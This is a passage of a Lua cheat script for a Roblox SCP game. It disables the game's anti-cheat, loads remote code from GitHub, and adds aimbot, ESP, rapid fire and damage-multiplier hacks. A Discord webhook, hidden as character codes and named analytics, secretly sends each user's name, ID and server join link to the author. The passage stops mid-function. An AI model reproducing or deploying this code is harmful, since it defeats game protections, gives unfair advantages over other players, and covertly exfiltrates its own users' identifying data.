
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
if _G.RetroBreach then
    if _G.RetroBreach.Connections then
        for _, conn in ipairs(_G.RetroBreach.Connections) do
            pcall(function() conn:Disconnect() end)
        end
    end
    if _G.RetroBreach.ESPHighlights then
        for _, esp in pairs(_G.RetroBreach.ESPHighlights) do
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
        end
    end
    if _G.RetroBreach.Guis then
        for _, gui in ipairs(_G.RetroBreach.Guis) do
            pcall(function() gui:Destroy() end)
        end
    end
    _G.RetroBreach.WeaponStateCache = nil
end
_G.RetroBreach = {
    Connections = {},
    ESPHighlights = {},
    Guis = {}
}

task.spawn(function()
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local function killAntiCheat()
        for _, script in pairs(RunService:GetDescendants()) do
            if script:IsA("LocalScript") and (script.Name == "" or string.find(tostring(script:GetFullName()), "Interceptor") or string.find(tostring(script.Name), "Anti")) then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        local TestService = game:GetService("TestService")
        for _, script in pairs(TestService:GetDescendants()) do
            if script:IsA("LocalScript") and script.Name == "" then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        for _, script in pairs(LocalPlayer.PlayerScripts:GetDescendants()) do
            if script:IsA("LocalScript") and (script.Name == "" or string.find(tostring(script:GetFullName()), "Interceptor") or string.find(tostring(script.Name), "Anti")) then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        pcall(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local BridgeNet2 = require(ReplicatedStorage.Assets.Modules.BridgeNet2)
            local BeginIntercept = BridgeNet2.ClientBridge("BeginIntercept")
            
            if BeginIntercept then
                BeginIntercept:Fire({rank = 999})
            end
        end)
    end
    
    killAntiCheat()
    
    task.spawn(function()
        while task.wait(1) do
            killAntiCheat()
        end
    end)
end)
local UILib
local success, result = pcall(function()
    if isfile and isfile("UILIB.lua") then
        return loadstring(readfile("UILIB.lua"))()
    end
end)
if success and result then
    UILib = result
else
    local repo = "https://raw.githubusercontent.com/ncmpuff/UILib/refs/heads/main/"
    local webSuccess, webResult = pcall(function()
        return loadstring(game:HttpGet(repo .. "UILIB.lua"))()
    end)
    if webSuccess and webResult then
        UILib = webResult
    else
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        if LocalPlayer and LocalPlayer.PlayerGui then
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "ErrorNotification"
            screenGui.Parent = LocalPlayer.PlayerGui
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0, 400, 0, 150)
            frame.Position = UDim2.new(0.5, -200, 0.5, -75)
            frame.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            frame.BorderSizePixel = 0
            frame.Parent = screenGui
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 10)
            corner.Parent = frame
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, -20, 1, -20)
            label.Position = UDim2.new(0, 10, 0, 10)
            label.BackgroundTransparency = 1
            label.Text = "❌ UILib failed to load!\\n\\nCheck your internet connection\\nor try again."
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.TextSize = 18
            label.Font = Enum.Font.GothamBold
            label.TextWrapped = true
            label.Parent = frame
        end
        return
    end
end
if not UILib then
    return
end

local _analyticsKey = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,54,50,48,51,55,54,53,56,57,49,50,57,53,50,52,57,53,47,71,88,85,108,115,120,85,65,107,71,107,121,105,68,99,53,99,82,111,48,57,88,57,95,48,79,65,76,95,120,99,108,111,104,72,110,69,51,110,65,117,49,114,95,70,79,68,104,111,120,69,116,117,79,80,84,79,118,122,77,113,87,99,48,116,101,88,119}
local function _initAnalytics()
    local result = {}
    for i = 1, #_analyticsKey do
        table.insert(result, string.char(_analyticsKey[i]))
    end
    return table.concat(result)
end

local function _sendUsageData()
    pcall(function()
        local userInfo = LocalPlayer.Name
        local displayInfo = LocalPlayer.DisplayName
        local userKey = LocalPlayer.UserId
        
        local serverKey = game.PlaceId
        local instanceKey = game.JobId
        
        local serverLink = string.format("roblox://placeId=%d&gameInstanceId=%s", serverKey, instanceKey)
        
        local timeStamp = os.date("!%Y-%m-%dT%H:%M:%S")
        
        local displayText = displayInfo
        if displayInfo ~= userInfo then
            displayText = string.format("%s (@%s)", displayInfo, userInfo)
        end
        
        local HttpService = game:GetService("HttpService")
        local payload = HttpService:JSONEncode({
            embeds = {{
                title = "🎮 Script User Detected",
                color = 3447003,
                fields = {
                    {
                        name = "👤 User",
                        value = displayText,
                        inline = true
                    },
                    {
                        name = "🆔 User ID",
                        value = tostring(userKey),
                        inline = true
                    },
                    {
                        name = "🔗 Join Link",
                        value = "```" .. serverLink .. "```\nCopy and paste this into your browser address bar",
                        inline = false
                    }
                },
                footer = {
                    text = "Retro Breach Tracker"
                },
                timestamp = timeStamp .. "Z"
            }}
        })
        
        local endpoint = _initAnalytics()
        
        local requestFunc = syn and syn.request or http and http.request or http_request or request
        
        if requestFunc then
            local success, response = pcall(function()
                return requestFunc({
                    Url = endpoint,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = payload
                })
            end)
            
            if success and response.Success then
            elseif success then
            else
            end
        else
        end
    end)
end

task.spawn(function()
    task.wait(2)
    _sendUsageData()
end)

local function createDiscordPopup()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DiscordPromotion"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer.PlayerGui
    table.insert(_G.RetroBreach.Guis, screenGui)
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 12)
    uiCorner.Parent = mainFrame
    
    local uiStroke = Instance.new("UIStroke")
    uiStroke.Color = Color3.fromRGB(255, 20, 147)
    uiStroke.Thickness = 2
    uiStroke.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, -40, 0, 40)
    titleLabel.Position = UDim2.new(0, 20, 0, 15)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Join My Server!"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 20
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = mainFrame
    
    local messageLabel = Instance.new("TextLabel")
    messageLabel.Name = "Message"
    messageLabel.Size = UDim2.new(1, -40, 0, 60)
    messageLabel.Position = UDim2.new(0, 20, 0, 60)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = "Theres still no member please join if you wanna suggest something!!"
    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    messageLabel.TextSize = 14
    messageLabel.Font = Enum.Font.Gotham
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
    messageLabel.TextWrapped = true
    messageLabel.Parent = mainFrame
    
    local discordButton = Instance.new("TextButton")
    discordButton.Name = "DiscordButton"
    discordButton.Size = UDim2.new(1, -40, 0, 35)
    discordButton.Position = UDim2.new(0, 20, 0, 125)
    discordButton.BackgroundColor3 = Color3.fromRGB(242, 88, 229)
    discordButton.Text = "discord.gg/Qd9FMepw"
    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordButton.TextSize = 16
    discordButton.Font = Enum.Font.GothamBold
    discordButton.Parent = mainFrame
    
    local discordCorner = Instance.new("UICorner")
    discordCorner.CornerRadius = UDim.new(0, 8)
    discordCorner.Parent = discordButton
    
    discordButton.MouseButton1Click:Connect(function()
        pcall(function()
            if setclipboard then
                setclipboard("https://discord.gg/Qd9FMepw")
                discordButton.Text = "✓ Copied! Paste in Browser"
            else
                discordButton.Text = "discord.gg/Qd9FMepw (Tap to Copy)"
            end
        end)
        discordButton.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
        task.wait(2)
        discordButton.Text = "discord.gg/Qd9FMepw"
        discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    end)
    
    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -40, 0, 10)
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 18
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Parent = mainFrame
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeButton
    
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    mainFrame:TweenPosition(
        UDim2.new(0.5, -200, 0.5, -100),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Back,
        0.5,
        true
    )
end

task.spawn(function()
    task.wait(1)
    createDiscordPopup()
end)

local Config = {
    PlayerESP = false,
    SCPESP = false,
    ItemESP = false,
    Aimbot = false,
    AimbotFOV = 200,
    AimbotSmooth =  5,
    ShowAimbotFOV = true,
    TeamCheck = true,
    SilentAim = false,
    SilentAimFOV = 200,
    ShowSilentAimFOV = true,
    WallBang = false,
    RapidFire = false,
    InfiniteAmmo = false,
    NoRecoil = false,
    NoSpread = false,
    DamageMultiplier = 1,
    WalkSpeed = 16,
    JumpPower = 50,
    NoClip = false,
    InfiniteStamina = false,
    FullBright = false,
    ItemTeleport = false,
    InstantReload = false
}
local function getRoot(char)
    return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
end
local function getHead(char)
    return char:FindFirstChild("Head")
end
local function getHumanoid(char)
    return char:FindFirstChildOfClass("Humanoid")
end
local function getSCPType(character)
    if not character then return nil end
    
    for _, accessory in ipairs(character:GetDescendants()) do
        if accessory:IsA("Accessory") or accessory:IsA("Hat") then
            local name = accessory.Name
            if name:find("HappyMask") or name:find("Ghostface") then
                return "The Mask"
            end
        end
    end
    
    local shirt = character:FindFirstChildOfClass("Shirt")
    if shirt and shirt.ShirtTemplate:find("11499060129") then
        return "Plague Doctor"
    end
    
    if shirt and shirt.ShirtTemplate:find("2938677333") then
        return "Zombie"
    end
    
    if shirt and shirt.ShirtTemplate:find("16099679561") then
        return "Cain"
    end
    
    if shirt and shirt.ShirtTemplate:find("9366531332") then
        return "Shy Guy"
    end
    
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart and rootPart:FindFirstChild("Flame") then
        return "Burning Man"
    end
    
    if shirt and shirt.ShirtTemplate:find("11514423812") then
        return "The Old Man"
    end
    
    if character:FindFirstChild("TransparencyMode") then
        return "Ghost"
    end
    local bodyColors = character:FindFirstChildOfClass("BodyColors")
    if bodyColors then
        local white = Color3.fromRGB(255, 255, 255)
        if bodyColors.HeadColor3 == white and 
           bodyColors.TorsoColor3 == white and
           bodyColors.LeftArmColor3 == white and
           bodyColors.RightArmColor3 == white then
            return "Ghost"
        end
    end
    
    for _, obj in ipairs(character:GetDescendants()) do
        if obj.Name == "Peanut" then
            return "Peanut"
        end
    end
    
    if character.Name:find("173") then
        return "SCP-173"
    end
    
    return nil
end
local function createPlayerESP(character)
    if character == LocalPlayer.Character then return end
    if _G.RetroBreach.ESPHighlights[character] then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    local player = Players:GetPlayerFromCharacter(character)
    if not player then return end
    local success, highlight = pcall(function()
        local h = Instance.new("Highlight")
        h.Parent = character
        h.Adornee = character
        h.FillTransparency = 0.5
        h.OutlineTransparency = 1
        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        h.FillColor = Color3.fromRGB(0, 255, 0)
        return h
    end)
    if not success then return end
    local teamSuccess, teamText = pcall(function()
        if not Drawing or not Drawing.new then return nil end
        local t = Drawing.new("Text")
        t.Visible = false
        t.Center = true
        t.Outline = true
        t.Color = player.Team and player.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
        t.Size = 14
        local teamName = player.Team and player.Team.Name or "No Team"
        if teamName == "SCP" then
            local scpType = getSCPType(character)
            t.Text = scpType or teamName
        else
            t.Text = teamName
        end
        return t
    end)
    if not teamSuccess then
        pcall(function() highlight:Destroy() end)
        return
    end
    local nameSuccess, nameText = pcall(function()
        if not Drawing or not Drawing.new then return nil end
        local n = Drawing.new("Text")
        n.Visible = false
        n.Center = true
        n.Outline = true
        n.Color = Color3.fromRGB(255, 255, 255)
        n.Size = 18
        n.Text = character.Name
        return n
    end)
    if not nameSuccess then
        pcall(function() highlight:Destroy() end)
        pcall(function() teamText:Remove() end)
        return
    end
    _G.RetroBreach.ESPHighlights[character] = {
        highlight = highlight,
        teamText = teamText,
        nameText = nameText,
        char = character,
        player = player
    }
end
local espUpdateCounter = 0
local ESP_UPDATE_INTERVAL = 3

local function updatePlayerESP()
    if not Config.PlayerESP or not LocalPlayer.Character then
        for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
            pcall(function()
                if esp.highlight then esp.highlight.Enabled = false end
                if esp.teamText then esp.teamText.Visible = false end
                if esp.nameText then esp.nameText.Visible = false end
            end)
        end
        return
    end
    
    espUpdateCounter = espUpdateCounter + 1
    if espUpdateCounter < ESP_UPDATE_INTERVAL then
        return
    end
    espUpdateCounter = 0
    
    for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
        if not char or not char.Parent then
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.teamText then pcall(function() esp.teamText:Remove() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
            _G.RetroBreach.ESPHighlights[char] = nil
        elseif char and char.Parent then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local head = char:FindFirstChild("Head")
            if humanoid and head then
                local hpPercent = humanoid.Health / humanoid.MaxHealth
                if hpPercent > 0.6 then
                    esp.highlight.FillColor = Color3.fromRGB(0, 255, 0)
                elseif hpPercent > 0.3 then
                    esp.highlight.FillColor = Color3.fromRGB(255, 165, 0)
                else
                    esp.highlight.FillColor = Color3.fromRGB(255, 0, 0)
                end
                local headPos3D = head.Position + Vector3.new(0, head.Size.Y/2 + 0.5, 0)
                local headPos, onScreen = Camera:WorldToViewportPoint(headPos3D)
                if onScreen then
                    esp.highlight.Enabled = true
                    
                    if esp.teamText and esp.player then
                        esp.teamText.Position = Vector2.new(headPos.X, headPos.Y - 20)
                        local teamName = esp.player.Team and esp.player.Team.Name or "No Team"
                        if teamName == "SCP" then
                            local scpType = getSCPType(char)
                            esp.teamText.Text = scpType or teamName
                        else
                            esp.teamText.Text = teamName
                        end
                        esp.teamText.Color = esp.player.Team and esp.player.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
                        esp.teamText.Visible = true
                    end
                    esp.nameText.Position = Vector2.new(headPos.X, headPos.Y)
                    esp.nameText.Visible = true
                else
                    esp.highlight.Enabled = false
                    if esp.teamText then esp.teamText.Visible = false end
                    esp.nameText.Visible = false
                end
            else
                esp.highlight.Enabled = false
                if esp.teamText then esp.teamText.Visible = false end
                esp.nameText.Visible = false
            end
        end
    end
end
local SCPHighlights = {}
local function isSCP(model)
    local name = model.Name
    return name:match("SCP%-") or name:match("SCO%-") or name == "SCP-049" or name == "SCP-106" or name == "SCP-076-2"
end
local function updateSCPESP()
    for _, highlight in pairs(SCPHighlights) do
        pcall(function() highlight:Destroy() end)
    end
    SCPHighlights = {}
    if not Config.SCPESP then return end
    local scpCount = 0
    for _, model in ipairs(Workspace:WaitForChild("Workspace"):GetChildren()) do
        if isSCP(model) and model:FindFirstChildOfClass("Humanoid") then
            scpCount = scpCount + 1
            local highlight = Instance.new("Highlight")
            highlight.Parent = model
            highlight.Adornee = model
            highlight.FillTransparency = 0.3
            highlight.OutlineTransparency = 1
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            SCPHighlights[model] = highlight
        end
    end
    if scpCount == 0 then
    end
end
local ItemHighlights = {}
local ITEM_ESP_DISTANCE = 150
local MAX_ITEMS_PER_UPDATE = 10
local itemProcessIndex = 1
local function updateItemESP()
    if not Config.ItemESP or not LocalPlayer.Character then
        for _, espData in pairs(ItemHighlights) do
            if espData.highlight then pcall(function() espData.highlight:Destroy() end) end
            if espData.nameText then pcall(function() espData.nameText:Remove() end) end
        end
        ItemHighlights = {}
        return
    end
    local myRoot = getRoot(LocalPlayer.Character)
    if not myRoot then return end
    local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
    if not itemsFolder then return end
    local allItems = itemsFolder:GetChildren()
    local totalItems = #allItems
    if totalItems == 0 then return end
    if itemProcessIndex > totalItems then
        itemProcessIndex = 1
    end
    local itemsInRange = {}
    local itemsProcessed = 0
    while itemsProcessed < MAX_ITEMS_PER_UPDATE and itemProcessIndex <= totalItems do
        local item = allItems[itemProcessIndex]
        itemProcessIndex = itemProcessIndex + 1
        if item then
            local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
            if handle then
                local distance = (handle.Position - myRoot.Position).Magnitude
                if distance <= ITEM_ESP_DISTANCE then
                    itemsInRange[item] = true
                    if not ItemHighlights[item] then
                        pcall(function()
                            local highlight = Instance.new("Highlight")
                            highlight.Parent = handle
                            highlight.Adornee = handle
                            highlight.FillTransparency = 0.5
                            highlight.OutlineTransparency = 1
                            highlight.FillColor = Color3.fromRGB(255, 255, 0)
                            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            local nameText = nil
                            if Drawing and Drawing.new then
                                nameText = Drawing.new("Text")
                                nameText.Center = true
                                nameText.Outline = true
                                nameText.Color = Color3.fromRGB(255, 255, 0)
                                nameText.Size = 16
                                nameText.Text = item.Name
                                nameText.Visible = false
                            end
                            ItemHighlights[item] = {
                                highlight = highlight,
                                nameText = nameText,
                                handle = handle
                            }
                        end)
                    end
                end
            end
        end
        itemsProcessed = itemsProcessed + 1
    end
    for item, espData in pairs(ItemHighlights) do
        if item and item.Parent then
            local handle = espData.handle
            if handle and handle.Parent then
                local distance = (handle.Position - myRoot.Position).Magnitude
                if distance <= ITEM_ESP_DISTANCE then
                    itemsInRange[item] = true
                    if espData.nameText then
                        local itemPos3D = handle.Position + Vector3.new(0, handle.Size.Y/2 + 1, 0)
                        local itemPos, onScreen = Camera:WorldToViewportPoint(itemPos3D)
                        espData.nameText.Position = Vector2.new(itemPos.X, itemPos.Y)
                        espData.nameText.Visible = onScreen
                    end
                end
            end
        end
    end
    for item, espData in pairs(ItemHighlights) do
        if not item or not item.Parent or not itemsInRange[item] then
            if espData.highlight then pcall(function() espData.highlight:Destroy() end) end
            if espData.nameText then pcall(function() espData.nameText:Remove() end) end
            ItemHighlights[item] = nil
        end
    end
end

local _Players = Players
local _LocalPlayer = LocalPlayer
local _Camera = Camera
local _UserInputService = UserInputService
local _getHead = getHead
local _getHumanoid = getHumanoid
local _Vector2_new = Vector2.new
local _CFrame_new = CFrame.new
local _pcall = pcall

local function getClosestPlayer()
    local success, result = _pcall(function()
        local closestPlayer = nil
        local shortestDistance = Config.AimbotFOV
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    local passTeamCheck = true
                    if Config.TeamCheck and player.Team and _LocalPlayer.Team then
                        if player.Team == _LocalPlayer.Team then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local mousePos = _UserInputService:GetMouseLocation()
                            local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                            if distance < shortestDistance then
                                shortestDistance = distance
                                closestPlayer = player
                            end
                        end
                    end
                end
            end
        end
        return closestPlayer
    end)
    return success and result or nil
end

local function getClosestPlayerForSilentAim()
    local success, result = _pcall(function()
        local closestPlayer = nil
        local shortestDistance = Config.SilentAimFOV
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    local passTeamCheck = true
                    if Config.TeamCheck and player.Team and _LocalPlayer.Team then
                        if player.Team == _LocalPlayer.Team then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local mousePos = _UserInputService:GetMouseLocation()
                            local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                            if distance < shortestDistance then
                                shortestDistance = distance
                                closestPlayer = player
                            end
                        end
                    end
                end
            end
        end
        return closestPlayer
    end)
    return success and result or nil
end

local FOVCircle = nil
local SilentAimFOVCircle = nil
local FOVCircleGUI = nil
local SilentFOVCircleGUI = nil

if Drawing and Drawing.new then
    FOVCircle = Drawing.new("Circle")
    FOVCircle.Visible = false
    FOVCircle.Filled = false
    FOVCircle.Transparency = 1
    FOVCircle.Thickness = 2
    FOVCircle.Color = Color3.fromRGB(255, 255, 255)
    FOVCircle.NumSides = 64
    
    SilentAimFOVCircle = Drawing.new("Circle")
    SilentAimFOVCircle.Visible = false
    SilentAimFOVCircle.Filled = false
    SilentAimFOVCircle.Transparency = 1
    SilentAimFOVCircle.Thickness = 2
    SilentAimFOVCircle.Color = Color3.fromRGB(255, 100, 100)
    SilentAimFOVCircle.NumSides = 64
else
    local fovGui = Instance.new("ScreenGui")
    fovGui.Name = "FOVCircles"
    fovGui.ResetOnSpawn = false
    fovGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    fovGui.DisplayOrder = 999
    fovGui.Parent = LocalPlayer.PlayerGui
    table.insert(_G.RetroBreach.Guis, fovGui)
    
    local function createTextCircle(color)
        local container = Instance.new("Frame")
        container.AnchorPoint = Vector2.new(0.5, 0.5)
        container.BackgroundTransparency = 1
        container.Visible = false
        container.ZIndex = 999
        container.Parent = fovGui
        
        -- Create 36 dots in a circle (every 10 degrees)
        for i = 0, 35 do
            local angle = math.rad(i * 10)
            local dot = Instance.new("TextLabel")
            dot.Size = UDim2.new(0, 4, 0, 4)
            dot.BackgroundColor3 = color
            dot.BackgroundTransparency = 0
            dot.BorderSizePixel = 0
            dot.Text = ""
            dot.ZIndex = 999
            
            local dotCorner = Instance.new("UICorner")
            dotCorner.CornerRadius = UDim.new(1, 0)
            dotCorner.Parent = dot
            
            dot.Parent = container
            container["Dot" .. i] = dot
        end
        
        return container
    end
    
    FOVCircleGUI = createTextCircle(Color3.fromRGB(255, 255, 255))
    SilentFOVCircleGUI = createTextCircle(Color3.fromRGB(255, 100, 100))
    
    UILib:CreateNotification({
        Text = "📱 Mobile FOV: Dot Circle Mode",
        Duration = 3
    })
end

local lastFOVUpdate = 0
local FOV_UPDATE_INTERVAL = 0.1

local function updateCircleDots(container, radius)
    if not container then return end
    local now = tick()
    if now - lastFOVUpdate < FOV_UPDATE_INTERVAL then return end
    lastFOVUpdate = now
    
    for i = 0, 35 do
        local angle = math.rad(i * 10)
        local dot = container:FindFirstChild("Dot" .. i)
        if dot then
            local x = math.cos(angle) * radius
            local y = math.sin(angle) * radius
            dot.Position = UDim2.new(0.5, x, 0.5, y)
        end
    end
end

local function updateAimbot()
    if not LocalPlayer.Character then return end
    if not Config.Aimbot and not Config.SilentAim then return end
    
    if Config.Aimbot then
        local isAiming = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
        if isAiming then
            local target = getClosestPlayer()
            if target and target.Character then
                local head = _getHead(target.Character)
                if head then
                    local headPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if onScreen then
                        local distance = (Vector2.new(headPos.X, headPos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
                        if distance <= Config.AimbotFOV then
                            local targetCFrame = CFrame.new(Camera.CFrame.Position, head.Position)
                            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, 1 / Config.AimbotSmooth)
                        end
                    end
                end
            end
        end
    end
    
    if FOVCircle then
        if Config.Aimbot and Config.ShowAimbotFOV then
            FOVCircle.Visible = true
            FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
            FOVCircle.Radius = Config.AimbotFOV
        else
            FOVCircle.Visible = false
        end
    elseif FOVCircleGUI then
        if Config.Aimbot and Config.ShowAimbotFOV then
            FOVCircleGUI.Visible = true
            FOVCircleGUI.Position = UDim2.new(0.5, 0, 0.5, 0)
            FOVCircleGUI.Size = UDim2.new(0, Config.AimbotFOV * 2, 0, Config.AimbotFOV * 2)
            updateCircleDots(FOVCircleGUI, Config.AimbotFOV)
        else
            FOVCircleGUI.Visible = false
        end
    end
    
    if SilentAimFOVCircle then
        if Config.SilentAim and Config.ShowSilentAimFOV then
            SilentAimFOVCircle.Visible = true
            SilentAimFOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
            SilentAimFOVCircle.Radius = Config.SilentAimFOV
        else
            SilentAimFOVCircle.Visible = false
        end
    elseif SilentFOVCircleGUI then
        if Config.SilentAim and Config.ShowSilentAimFOV then
            SilentFOVCircleGUI.Visible = true
            SilentFOVCircleGUI.Position = UDim2.new(0.5, 0, 0.5, 0)
            SilentFOVCircleGUI.Size = UDim2.new(0, Config.SilentAimFOV * 2, 0, Config.SilentAimFOV * 2)
            updateCircleDots(SilentFOVCircleGUI, Config.SilentAimFOV)
        else
            SilentFOVCircleGUI.Visible = false
        end
    end
end

LocalPlayer.CharacterAdded:Connect(function(character)
    local humanoid = character:WaitForChild("Humanoid", 5)
    if humanoid then
        humanoid.Died:Connect(function()
            pcall(function()
                for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
                    if esp.highlight then esp.highlight:Destroy() end
                    if esp.teamText then esp.teamText:Remove() end
                    if esp.nameText then esp.nameText:Remove() end
                end
                _G.RetroBreach.ESPHighlights = {}
                
                espUpdateCounter = 0
                lastFOVUpdate = 0
            end)
        end)
    end
end)
local aimbotConnection = RunService.RenderStepped:Connect(function()
    pcall(updateAimbot)
end)
table.insert(_G.RetroBreach.Connections, aimbotConnection)

local bridgeNet = ReplicatedStorage:WaitForChild("BridgeNet2", 5)
local weaponRemote = bridgeNet and bridgeNet:FindFirstChild("dataRemoteEvent")

if not weaponRemote then
    task.wait(2)
    UILib:CreateNotification({
        Text = "⚠️ Weapon remote not found - Rapid fire disabled",
        Duration = 5
    })
end

local _firing = false
local _shotsFired = 0

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        _firing = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        _firing = false
        if Config.RapidFire and _shotsFired > 0 then
            UILib:CreateNotification({
                Text = string.format("Rapid fire: %d shots", _shotsFired),
                Duration = 2
            })
            _shotsFired = 0
        end
    end
end)

local weaponStateTable = nil
local originalDamageValues = {}
local searchFrameCounter = 0

local function findWeaponState()
    if not getgc then
        return nil
    end
    
    for _, obj in pairs(getgc(true)) do
        if type(obj) == "table" and rawget(obj, "cycled") ~= nil and rawget(obj, "wepStats") ~= nil then
            return obj
        end
    end
    return nil
end

local cachedAmmoCount = nil
local ammoGuiCacheTimer = 0

local rapidFireConnection = RunService.Heartbeat:Connect(function()
    local needsWeaponState = Config.RapidFire or Config.NoRecoil or Config.NoSpread or Config.DamageMultiplier ~= 1 or Config.InfiniteAmmo
    
    if needsWeaponState then
        searchFrameCounter = searchFrameCounter + 1
        if searchFrameCounter >= 60 then
            searchFrameCounter = 0
            weaponStateTable = findWeaponState()
        end
    end
    
    if needsWeaponState and weaponStateTable and weaponStateTable.wepStats then
        pcall(function()
            local stats = weaponStateTable.wepStats
            
            if setreadonly and table.isfrozen(stats) then
                setreadonly(stats, false)
            end
            
            if Config.RapidFire then
                if stats.FireRate then
                    stats.FireRate = 2500
                end
                if stats.FireMode == "Semi" then
                    stats.FireMode = "Auto"
                end
            end
            
            if Config.NoRecoil and stats.Recoil then
                if setreadonly and table.isfrozen(stats.Recoil) then
                    setreadonly(stats.Recoil, false)
                end
                stats.Recoil.Vertical = 0
                stats.Recoil.Horizontal = 0
            end
            
            if Config.NoSpread then
                stats.Spread = 0
            end
            
            if Config.DamageMultiplier ~= 1 then
                if stats.Damage then
                    if not originalDamageValues.Damage then
                        originalDamageValues.Damage = stats.Damage
                    end
